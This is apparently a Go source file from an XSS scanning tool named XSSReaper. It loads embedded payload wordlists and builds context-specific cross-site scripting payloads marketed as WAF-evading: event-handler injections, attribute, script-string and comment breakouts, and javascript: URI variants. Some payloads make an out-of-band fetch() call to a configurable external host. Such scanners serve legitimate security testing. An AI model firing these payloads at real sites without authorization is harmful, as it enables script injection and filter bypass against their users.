package payloads

import (
	"bufio"
	"embed"
	"fmt"
	"regexp"
	"strings"

	"github.com/youwannahackme/XSSReaper/internal/models"
)

//go:embed data/*.txt
var payloadFS embed.FS

// GetDefaultPayloadList returns a clean list of XSS payloads from all categorized files inside data/*.txt.
func GetDefaultPayloadList() []string {
	var p []string
	seen := make(map[string]bool)

	addPayloads := func(content string) {
		scanner := bufio.NewScanner(strings.NewReader(content))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" && !strings.HasPrefix(line, "#") && !seen[line] {
				seen[line] = true
				p = append(p, line)
			}
		}
		_ = scanner.Err()
	}

	entries, err := payloadFS.ReadDir("data")
	if err != nil {
		return p
	}
	for _, entry := range entries {
		if !entry.IsDir() && strings.HasSuffix(entry.Name(), ".txt") {
			content, err := payloadFS.ReadFile("data/" + entry.Name())
			if err == nil {
				addPayloads(string(content))
			}
		}
	}

	return p
}

// GetCategorizedPayloadList returns the full embedded list of payloads specifically matching the reflection context, plus polyglots.
func GetCategorizedPayloadList(ctx models.ContextType) []string {
	var p []string
	seen := make(map[string]bool)

	addPayloads := func(filename string) {
		content, err := payloadFS.ReadFile("data/" + filename)
		if err != nil {
			return
		}
		scanner := bufio.NewScanner(strings.NewReader(string(content)))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" && !strings.HasPrefix(line, "#") && !seen[line] {
				seen[line] = true
				p = append(p, line)
			}
		}
		_ = scanner.Err()
	}

	// Always include universal polyglots
	addPayloads("xsspollygots.txt")

	switch ctx {
	case models.ContextHTMLBody, models.ContextDOMSink:
		addPayloads("html_body.txt")
	case models.ContextAttrDouble:
		addPayloads("attr_double.txt")
	case models.ContextAttrSingle:
		addPayloads("attr_single.txt")
	case models.ContextAttrUnquoted:
		addPayloads("attr_unquoted.txt")
	case models.ContextScriptString, models.ContextScriptBare, models.ContextScriptJSON:
		addPayloads("js_string.txt")
	case models.ContextURLContext:
		addPayloads("uri_schemes.txt")
	case models.ContextCSS, models.ContextComment:
		addPayloads("special_elements.txt")
	default:
		addPayloads("special_elements.txt")
		addPayloads("html_body.txt")
	}

	return p
}

// AdaptPayloadForNonce adapts an arbitrary payload (e.g., from polyglot or external wordlist)
// so that alert(), prompt(), confirm(), or alert(anything) calls trigger our confirmation nonce callback window.__xss_<nonce>().
var (
	// alertRegex matches alert/prompt/confirm/print calls supporting up to 2 levels of nested parentheses (e.g., alert(String.fromCharCode(88,83,83)))
	alertRegex = regexp.MustCompile(`(?:alert|prompt|confirm|print)\s*\((?:[^)(]+|\([^)(]*\))*\)`)
	// alertRegexBacktick matches ES6 template literal invocations (e.g., alert`1` or prompt`document.domain`)
	alertRegexBacktick = regexp.MustCompile(`(?:alert|prompt|confirm|print)\s*` + "`[^`]*`")
)

func AdaptPayloadForNonce(payload string, nonce string) string {
	if nonce == "" {
		return payload
	}
	fnCall := fmt.Sprintf("window.__xss_%s()", nonce)
	// Replace any alert/prompt/confirm/print call with nested parentheses
	adapted := alertRegex.ReplaceAllString(payload, fnCall)
	// Replace any template literal call
	adapted = alertRegexBacktick.ReplaceAllString(adapted, fnCall)
	// Also do simple literal replacements for bare or uncaptured occurrences if needed
	replacements := []string{
		"alert()", fnCall,
		"alert(1)", fnCall,
		"alert('XSS')", fnCall,
		`alert("XSS")`, fnCall,
		"alert(`XSS`)", fnCall,
		"print()", fnCall,
	}
	r := strings.NewReplacer(replacements...)
	return r.Replace(adapted)
}

// GetPayloadsForContext returns context-specific, intelligent WAF-evading payloads tailored to trigger window.__xss_<nonce>() or an out-of-band callback.
func GetPayloadsForContext(ctx models.ContextType, nonce string, oobURL string) []string {
	fnCall := fmt.Sprintf("window.__xss_%s()", nonce)
	oobCall := ""
	if oobURL != "" {
		oobCall = fmt.Sprintf("fetch(%q)", strings.TrimSuffix(oobURL, "/")+"/"+nonce)
	}

	var p []string

	switch ctx {
	case models.ContextHTMLBody:
		p = append(p,
			// Standard & HTML5 Event Sinks
			fmt.Sprintf("<script>%s</script>", fnCall),
			fmt.Sprintf("<img src=x onerror=%s>", fnCall),
			fmt.Sprintf("<svg onload=%s>", fnCall),
			fmt.Sprintf("<details open ontoggle=%s>", fnCall),
			fmt.Sprintf("<body onload=%s>", fnCall),
			fmt.Sprintf("<input autofocus onfocus=%s>", fnCall),
			fmt.Sprintf("<select autofocus onfocus=%s>", fnCall),
			fmt.Sprintf("<textarea autofocus onfocus=%s>", fnCall),
			// WAF Space Evasion (using slash separator instead of space)
			fmt.Sprintf("<img/src=1/onerror=%s>", fnCall),
			fmt.Sprintf("<svg/onload=%s>", fnCall),
			fmt.Sprintf("<details/open/ontoggle=%s>", fnCall),
			fmt.Sprintf("<input/autofocus/onfocus=%s>", fnCall),
			fmt.Sprintf("<iframe/onload=%s>", fnCall),
			// Modern Pointer & Mouse Interaction Handlers (bypasses onerror/onload signatures)
			fmt.Sprintf("<svg/onpointerover=%s>", fnCall),
			fmt.Sprintf("<div/onpointerenter=%s style=width:100%%;height:100%%>", fnCall),
			fmt.Sprintf("<img/src=1/onauxclick=%s>", fnCall),
			// Obfuscated & Timeout Execution
			fmt.Sprintf("<script>setTimeout(%q,0)</script>", fnCall),
		)
		if oobCall != "" {
			p = append(p,
				fmt.Sprintf("<script>%s</script>", oobCall),
				fmt.Sprintf("<img/src=1/onerror=%s>", oobCall),
			)
		}

	case models.ContextAttrDouble:
		p = append(p,
			// Zero-Angle-Bracket Breakouts (Bypasses all <script> tag filters and `<` escaping)
			fmt.Sprintf(`" autofocus onfocus="%s`, fnCall),
			fmt.Sprintf(`" onmouseover="%s`, fnCall),
			fmt.Sprintf(`" onpointerover="%s" style="position:fixed;top:0;left:0;width:100%%;height:100%%`, fnCall),
			fmt.Sprintf(`" ontoggle="%s" open x="`, fnCall),
			fmt.Sprintf(`" onfocusin="%s" autofocus x="`, fnCall),
			fmt.Sprintf(`";%s;//`, fnCall),
			// Tag Breakouts with WAF Space & Keyword Evasion
			fmt.Sprintf(`"><script>%s</script>`, fnCall),
			fmt.Sprintf(`"><svg/onload=%s>`, fnCall),
			fmt.Sprintf(`"><details/open/ontoggle=%s>`, fnCall),
			fmt.Sprintf(`"><img/src=1/onerror=%s>`, fnCall),
			fmt.Sprintf(`"><input/autofocus/onfocus=%s>`, fnCall),
		)
		if oobCall != "" {
			p = append(p,
				fmt.Sprintf(`"><script>%s</script>`, oobCall),
				fmt.Sprintf(`" autofocus onfocus="%s`, oobCall),
			)
		}

	case models.ContextAttrSingle:
		p = append(p,
			// Zero-Angle-Bracket Breakouts
			fmt.Sprintf(`' autofocus onfocus='%s`, fnCall),
			fmt.Sprintf(`' onmouseover='%s`, fnCall),
			fmt.Sprintf(`' onpointerover='%s' style='position:fixed;top:0;left:0;width:100%%;height:100%%`, fnCall),
			fmt.Sprintf(`' ontoggle='%s' open x='`, fnCall),
			fmt.Sprintf(`';%s;//`, fnCall),
			// Tag Breakouts
			fmt.Sprintf(`'><script>%s</script>`, fnCall),
			fmt.Sprintf(`'><svg/onload=%s>`, fnCall),
			fmt.Sprintf(`'><details/open/ontoggle=%s>`, fnCall),
			fmt.Sprintf(`'><img/src=1/onerror=%s>`, fnCall),
		)
		if oobCall != "" {
			p = append(p,
				fmt.Sprintf(`'><script>%s</script>`, oobCall),
				fmt.Sprintf(`' autofocus onfocus='%s`, oobCall),
			)
		}

	case models.ContextAttrUnquoted:
		p = append(p,
			fmt.Sprintf(`autofocus onfocus=%s`, fnCall),
			fmt.Sprintf(`onmouseover=%s`, fnCall),
			fmt.Sprintf(`ontoggle=%s open`, fnCall),
			fmt.Sprintf(`><script>%s</script>`, fnCall),
			fmt.Sprintf(`><svg/onload=%s>`, fnCall),
			fmt.Sprintf(`><details/open/ontoggle=%s>`, fnCall),
		)

	case models.ContextScriptString:
		p = append(p,
			// JavaScript String Breakouts & Arithmetic Operators (Bypasses HTML parsers)
			fmt.Sprintf(`";%s;//`, fnCall),
			fmt.Sprintf(`';%s;//`, fnCall),
			fmt.Sprintf(`"-(%s)-"`, fnCall),
			fmt.Sprintf(`'-(%s)-'`, fnCall),
			fmt.Sprintf(`\/%s\/`, fnCall),
			fmt.Sprintf(`\n;%s;//`, fnCall),
			fmt.Sprintf(`</script><script>%s</script>`, fnCall),
			fmt.Sprintf(`</script><svg/onload=%s>`, fnCall),
		)

	case models.ContextScriptBare:
		p = append(p,
			fnCall,
			fmt.Sprintf(`;%s;`, fnCall),
			fmt.Sprintf(`-(%s)-`, fnCall),
			fmt.Sprintf(`</script><script>%s</script>`, fnCall),
		)

	case models.ContextURLContext:
		p = append(p,
			// URI Scheme Bypasses & Case/Whitespace Variations
			fmt.Sprintf("javascript:%s", fnCall),
			fmt.Sprintf("javascript:%s//", fnCall),
			fmt.Sprintf("JaVaScRiPt:%s", fnCall),
			fmt.Sprintf("javascript%%3A%s", fnCall),
			fmt.Sprintf("javascript%%0A:%s", fnCall),
			fmt.Sprintf("javascript%%09:%s", fnCall),
			fmt.Sprintf("data:text/html,<script>%s</script>", fnCall),
			fmt.Sprintf(`"><script>%s</script>`, fnCall),
			fmt.Sprintf(`"><svg/onload=%s>`, fnCall),
		)

	case models.ContextDOMSink:
		p = append(p,
			fmt.Sprintf("<img src=x onerror=%s>", fnCall),
			fmt.Sprintf("<svg onload=%s>", fnCall),
			fmt.Sprintf("<details open ontoggle=%s>", fnCall),
			fmt.Sprintf("<input autofocus onfocus=%s>", fnCall),
			fmt.Sprintf(`"><svg/onload=%s>`, fnCall),
			fnCall,
		)

	case models.ContextComment:
		p = append(p,
			fmt.Sprintf(`--><script>%s</script><!--`, fnCall),
			fmt.Sprintf(`--><svg/onload=%s><!--`, fnCall),
			fmt.Sprintf(`--><details/open/ontoggle=%s><!--`, fnCall),
		)

	default:
		p = append(p,
			fmt.Sprintf("<script>%s</script>", fnCall),
			fmt.Sprintf("<svg/onload=%s>", fnCall),
		)
	}

	return p
}
